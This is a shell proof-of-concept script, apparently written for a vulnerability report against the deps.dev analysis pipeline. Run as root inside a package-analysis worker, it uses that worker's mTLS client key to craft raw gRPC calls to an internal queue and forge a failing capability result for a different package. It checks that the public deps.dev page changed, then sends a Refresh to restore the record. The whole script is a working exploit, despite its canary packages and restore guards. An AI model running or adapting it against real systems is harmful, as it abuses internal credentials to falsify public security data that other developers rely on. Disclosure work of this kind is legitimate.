#!/bin/sh
set -eu

LC_ALL=C
export LC_ALL

usage() {
  cat <<'EOF'
Usage:
  ./poc.sh

From Robert's exact owned source A worker, writes one error-only
CapabilityResultAction for Robert's exact owned target B, proves B's public
deps.dev `hasErrors` value changes, sends Talisman.Refresh for B, and waits for
the exact baseline hash to return.

Environment overrides:
  POLL_INTERVAL     Seconds between deps.dev reads (default: 5)
  POLL_TIMEOUT      Timeout for each poll phase (default: 600)
EOF
}

emit_byte() {
  byte_octal=$(printf '%03o' "$1")
  printf "\\$byte_octal"
}

emit_varint() {
  varint_value=$1
  while [ "$varint_value" -ge 128 ]; do
    emit_byte $((varint_value % 128 + 128))
    varint_value=$((varint_value / 128))
  done
  emit_byte "$varint_value"
}

emit_u32be() {
  u32_value=$1
  emit_byte $((u32_value >> 24 & 255))
  emit_byte $((u32_value >> 16 & 255))
  emit_byte $((u32_value >> 8 & 255))
  emit_byte $((u32_value & 255))
}

byte_length() {
  printf %s "$1" | wc -c | awk '{print $1}'
}

file_size() {
  wc -c <"$1" | awk '{print $1}'
}

write_grpc_frame() {
  frame_message=$1
  frame_size=$(file_size "$frame_message")
  emit_byte 0
  emit_u32be "$frame_size"
  cat "$frame_message"
}

build_push() {
  push_output=$1

  {
    emit_byte 10
    emit_varint "$(byte_length "$QUEUE")"
    printf %s "$QUEUE"
    emit_byte 34
    emit_varint "$(byte_length "$SOURCE")"
    printf %s "$SOURCE"
  } >"$receipt_dir/queue-metadata.bin"

  {
    emit_byte 10
    emit_varint "$(file_size "$receipt_dir/queue-metadata.bin")"
    cat "$receipt_dir/queue-metadata.bin"
  } >"$receipt_dir/queue-request.bin"

  {
    emit_byte 10
    emit_varint "$(byte_length "$TARGET")"
    printf %s "$TARGET"
    emit_byte 26
    emit_varint "$(byte_length "$MARKER")"
    printf %s "$MARKER"
  } >"$receipt_dir/action.bin"

  {
    emit_byte 26
    emit_varint "$(file_size "$receipt_dir/action.bin")"
    cat "$receipt_dir/action.bin"
  } >"$receipt_dir/result.bin"

  {
    emit_byte 10
    emit_varint "$(file_size "$receipt_dir/result.bin")"
    cat "$receipt_dir/result.bin"
  } >"$receipt_dir/push-request.bin"

  : >"$push_output"
  write_grpc_frame "$receipt_dir/queue-request.bin" >>"$push_output"
  write_grpc_frame "$receipt_dir/push-request.bin" >>"$push_output"
}

build_refresh() {
  refresh_output=$1

  # sos.VersionKey: system=GO, kind=VERSION, package, version.
  {
    emit_byte 8
    emit_byte 1
    emit_byte 16
    emit_byte 1
    emit_byte 26
    emit_varint "$(byte_length "$PACKAGE")"
    printf %s "$PACKAGE"
    emit_byte 32
    emit_byte 1
    emit_byte 42
    emit_varint "$(byte_length "$VERSION")"
    printf %s "$VERSION"
  } >"$receipt_dir/version-key.bin"

  {
    emit_byte 10
    emit_varint "$(file_size "$receipt_dir/version-key.bin")"
    cat "$receipt_dir/version-key.bin"
  } >"$receipt_dir/version-key-envelope.bin"

  {
    emit_byte 18
    emit_varint "$(file_size "$receipt_dir/version-key-envelope.bin")"
    cat "$receipt_dir/version-key-envelope.bin"
  } >"$receipt_dir/refresh-request.bin"

  write_grpc_frame "$receipt_dir/refresh-request.bin" >"$refresh_output"
}

grpc_call() {
  grpc_method=$1
  grpc_request=$2
  grpc_prefix=$3
  curl -sS --noproxy '*' --http2 --connect-timeout 10 --max-time 30 \
    --resolve "localhost:9000:${BACKEND_IP}" \
    --cacert "$CA" --cert "$CERT" --key "$KEY" \
    -H 'content-type: application/grpc' -H 'te: trailers' \
    --data-binary @"$grpc_request" \
    -D "$receipt_dir/$grpc_prefix.headers" \
    "https://localhost:9000/$grpc_method" \
    -o "$receipt_dir/$grpc_prefix.body"
}

grpc_ok() {
  tr -d '\r' <"$1" | grep -qix 'grpc-status: 0'
}

fetch_public() {
  fetch_output=$1
  public_status=$(curl -sS --connect-timeout 10 --max-time 15 \
    -o "$fetch_output" -w '%{http_code}' "$DEPSDEV_URL" \
    2>>"$receipt_dir/public-curl.err" || true)
  [ -n "$public_status" ] || public_status=000
  public_digest=-
  if [ "$public_status" = 200 ] && [ -s "$fetch_output" ]; then
    public_digest=$(sha256sum "$fetch_output" | awk '{print $1}')
  fi
}

poll_public() {
  poll_mode=$1
  poll_want=$2
  poll_elapsed=0

  while [ "$poll_elapsed" -le "$POLL_TIMEOUT" ]; do
    fetch_public "$receipt_dir/public-current.json"
    poll_timestamp=$(date -u +'%Y-%m-%dT%H:%M:%SZ')
    printf '%s phase=%s status=%s sha256=%s\n' \
      "$poll_timestamp" "$poll_mode" "$public_status" "$public_digest" |
      tee -a "$receipt_dir/public-poll.log"

    if [ "$public_status" = 200 ] && [ "$public_digest" != - ]; then
      if [ "$poll_mode" = changed ] && [ "$public_digest" = "$EXPECTED_ALTERED_SHA256" ] &&
        grep -Fq '"package":"github.com/benr00t3d/go-byteman-crosswrite-canary"' "$fetch_output" &&
        grep -Fq '"version":"v0.0.1"' "$fetch_output" &&
        grep -Fq '"hasErrors":true' "$fetch_output"; then
        cp "$receipt_dir/public-current.json" "$receipt_dir/public-altered.json"
        ALTERED_HASH=$public_digest
        return 0
      fi
      if [ "$poll_mode" = restore ] && [ "$public_digest" = "$poll_want" ] &&
        grep -Fq '"hasErrors":false' "$fetch_output"; then
        cp "$receipt_dir/public-current.json" "$receipt_dir/public-restored.json"
        restored=1
        return 0
      fi
    fi

    sleep "$POLL_INTERVAL"
    poll_elapsed=$((poll_elapsed + POLL_INTERVAL))
  done
  return 124
}

send_refresh() {
  build_refresh "$receipt_dir/refresh.bin"
  refresh_request_hash=$(sha256sum "$receipt_dir/refresh.bin" | awk '{print $1}')
  [ "$refresh_request_hash" = "$EXPECTED_REFRESH_SHA256" ] || {
    printf 'Refusing: Refresh frame hash mismatch: %s\n' "$refresh_request_hash" >&2
    return 1
  }
  printf 'REFRESH_TARGET=%s\n' "$TARGET"
  printf 'REFRESH_REQUEST_SHA256=%s\n' "$refresh_request_hash"
  if ! grpc_call 'sos.talisman.Talisman/Refresh' "$receipt_dir/refresh.bin" refresh; then
    printf '%s\n' 'REFRESH_GRPC_OK=0 (curl failed)' >&2
    return 1
  fi
  refresh_body_bytes=$(file_size "$receipt_dir/refresh.body")
  [ "$refresh_body_bytes" -le 4096 ] || {
    printf 'REFRESH_GRPC_OK=0 (oversize body: %s)\n' "$refresh_body_bytes" >&2
    return 1
  }
  printf 'REFRESH_BODY_BYTES=%s\n' "$refresh_body_bytes"
  printf 'REFRESH_BODY_SHA256='
  sha256sum "$receipt_dir/refresh.body" | awk '{print $1}'
  if ! grpc_ok "$receipt_dir/refresh.headers"; then
    printf '%s\n' 'REFRESH_GRPC_OK=0' >&2
    return 1
  fi
  printf 'REFRESH_GRPC_OK=1\n'
}

on_exit() {
  exit_rc=$?
  trap - EXIT HUP INT TERM

  # A curl error does not prove that Push failed server-side, so restore after
  # every attempted Push. This never sends another CapabilityResultAction.
  if [ "$push_may_have_landed" -eq 1 ] && [ "$restored" -eq 0 ]; then
    set +e
    send_refresh
    refresh_rc=$?
    if [ "$refresh_rc" -eq 0 ]; then
      poll_public restore "$baseline_hash"
      restore_rc=$?
    else
      restore_rc=1
    fi

    if [ "$restored" -eq 1 ]; then
      printf 'E2E_RESTORED=1 baseline_sha256=%s\n' "$baseline_hash"
    else
      printf 'E2E_RESTORED=0 refresh_rc=%s poll_rc=%s\n' \
        "$refresh_rc" "$restore_rc" >&2
      [ "$exit_rc" -ne 0 ] || exit_rc=1
    fi
  fi

  printf 'RECEIPTS=%s\n' "$receipt_dir"
  exit "$exit_rc"
}

main() {
  [ "$#" -eq 0 ] || { usage >&2; exit 2; }
  CURRENT='github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.62-codex'
  TARGET='github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.1'
  PACKAGE=${TARGET%@*}
  VERSION=${TARGET##*@}
  QUEUE='capslock-capability-result'
  SOURCE='robert-owned-v062-a-to-b-public-canary'
  MARKER='CROSSPKG_V062_B_ZIP_SHA256_e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684_PUBLIC_RESULT_CANARY'
  EXPECTED_PUSH_SHA256='b846a01ea50cf758630fd4c9597937f81b8bf91fb46a8058a181af48bf965d2b'
  EXPECTED_REFRESH_SHA256='5f5604aff7ef29643b7768e58b3dfdc510e58adcd37e596ac0892b72c733290a'
  EXPECTED_BASELINE_SHA256='bb0f29abd8210aa614a6175e38265532487079bebd25ab94ca21eaaeb13c157c'
  EXPECTED_ALTERED_SHA256='5ec2c29ccadbf5bee106dbc53146bb8c2ec5edd37f573720c4bfabe5ca01efa4'

  POLL_INTERVAL=${POLL_INTERVAL:-5}
  POLL_TIMEOUT=${POLL_TIMEOUT:-600}
  case "$POLL_INTERVAL:$POLL_TIMEOUT" in
    *[!0-9:]*) printf '%s\n' 'Refusing: poll settings must be integers.' >&2; exit 2 ;;
  esac
  [ "$POLL_INTERVAL" -gt 0 ] && [ "$POLL_TIMEOUT" -gt 0 ] || {
    printf '%s\n' 'Refusing: poll settings must be positive.' >&2
    exit 2
  }

  [ "$(id -u)" -eq 0 ] || { printf '%s\n' 'Refusing: not root.' >&2; exit 2; }
  pid1_cmdline=$(tr '\000' ' ' </proc/1/cmdline)
  case "$pid1_cmdline" in
    *talisman-worker-capabilities*) ;;
    *) printf '%s\n' 'Refusing: unexpected PID 1.' >&2; exit 2 ;;
  esac
  case "$(pwd -P)" in
    */capslock/modcache/"$CURRENT") ;;
    *) printf 'Refusing: not inside the owned Capslock directory for %s.\n' "$CURRENT" >&2; exit 2 ;;
  esac

  CA='/etc/tls/server-pool/server-tls-pool.pem'
  CERT='/etc/tls/client/tls.crt'
  KEY='/etc/tls/client/tls.key'
  for path in "$CA" "$CERT" "$KEY"; do
    [ -r "$path" ] || { printf 'Refusing: missing %s\n' "$path" >&2; exit 2; }
  done
  BACKEND_IP=$(getent ahostsv4 talisman-core.default.svc.cluster.local 2>/dev/null | awk 'NR == 1 {print $1}')
  [ -n "$BACKEND_IP" ] || { printf '%s\n' 'Refusing: backend did not resolve.' >&2; exit 2; }

  package_url=$(printf %s "$PACKAGE" | sed -e 's|/|%2F|g' -e 's/+/%2B/g')
  version_url=$(printf %s "$VERSION" | sed -e 's/+/%2B/g')
  DEPSDEV_URL="https://deps.dev/_/s/go/p/$package_url/v/$version_url/analysis"

  receipt_dir=$(mktemp -d /tmp/go-crosspkg-v062.XXXXXX)
  push_may_have_landed=0
  restored=0
  baseline_hash=
  trap on_exit EXIT
  trap 'exit 129' HUP
  trap 'exit 130' INT
  trap 'exit 143' TERM

  printf 'CURRENT=%s\nTARGET=%s\nMARKER=%s\nDEPSDEV_URL=%s\n' \
    "$CURRENT" "$TARGET" "$MARKER" "$DEPSDEV_URL"

  fetch_public "$receipt_dir/public-baseline.json"
  [ "$public_status" = 200 ] && [ "$public_digest" = "$EXPECTED_BASELINE_SHA256" ] || {
    printf 'Refusing: deps.dev baseline status=%s sha256=%s\n' \
      "$public_status" "$public_digest" >&2
    exit 1
  }
  grep -Fq '"package":"github.com/benr00t3d/go-byteman-crosswrite-canary"' "$receipt_dir/public-baseline.json" &&
    grep -Fq '"version":"v0.0.1"' "$receipt_dir/public-baseline.json" &&
    grep -Fq '"hasErrors":false' "$receipt_dir/public-baseline.json" || {
      printf '%s\n' 'Refusing: target B baseline is not the exact expected clean record.' >&2
      exit 1
    }
  baseline_hash=$public_digest
  printf 'BASELINE_SHA256=%s\n' "$baseline_hash"

  # Exactly one error-only action; dynamic protobuf and gRPC lengths throughout.
  build_push "$receipt_dir/push.bin"
  push_request_hash=$(sha256sum "$receipt_dir/push.bin" | awk '{print $1}')
  [ "$push_request_hash" = "$EXPECTED_PUSH_SHA256" ] || {
    printf 'Refusing: Push frame hash mismatch: %s\n' "$push_request_hash" >&2
    exit 1
  }
  printf 'PUSH_REQUEST_SHA256=%s\n' "$push_request_hash"
  push_may_have_landed=1
  if ! grpc_call 'sos.queue.Queue/Push' "$receipt_dir/push.bin" push; then
    printf '%s\n' 'Push curl failed; attempting restoration.' >&2
    exit 1
  fi

  push_body_bytes=$(file_size "$receipt_dir/push.body")
  [ "$push_body_bytes" -le 16384 ] || {
    printf 'PUSH_GRPC_OK=0 (oversize body: %s)\n' "$push_body_bytes" >&2
    exit 1
  }
  printf 'PUSH_BODY_BYTES=%s\n' "$push_body_bytes"
  printf 'PUSH_BODY_SHA256='
  sha256sum "$receipt_dir/push.body" | awk '{print $1}'
  grpc_ok "$receipt_dir/push.headers" || {
    printf '%s\n' 'PUSH_GRPC_OK=0' >&2
    exit 1
  }
  printf 'PUSH_GRPC_OK=1\n'

  action_ids=$(grep -aEo '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
    "$receipt_dir/push.body" || true)
  [ "$(printf '%s\n' "$action_ids" | grep -c .)" -eq 1 ] || {
    printf '%s\n' 'Expected exactly one server action ID.' >&2
    exit 1
  }
  action_id=$action_ids
  grep -aFq "$TARGET" "$receipt_dir/push.body" &&
    grep -aFq "$MARKER" "$receipt_dir/push.body" || {
      printf '%s\n' 'PUSH_ECHOES_TARGET_AND_MARKER=0' >&2
      exit 1
    }
  printf 'ACTION_ID=%s\nPUSH_ECHOES_TARGET_AND_MARKER=1\n' "$action_id"

  if ! poll_public changed "$baseline_hash"; then
    printf '%s\n' 'Timed out waiting for a changed deps.dev hash.' >&2
    exit 124
  fi
  printf 'E2E_CHANGE_PROVEN=1 before=%s after=%s action_id=%s\n' \
    "$baseline_hash" "$ALTERED_HASH" "$action_id"

  # EXIT trap sends Refresh and polls for the baseline hash.
}

main "$@"
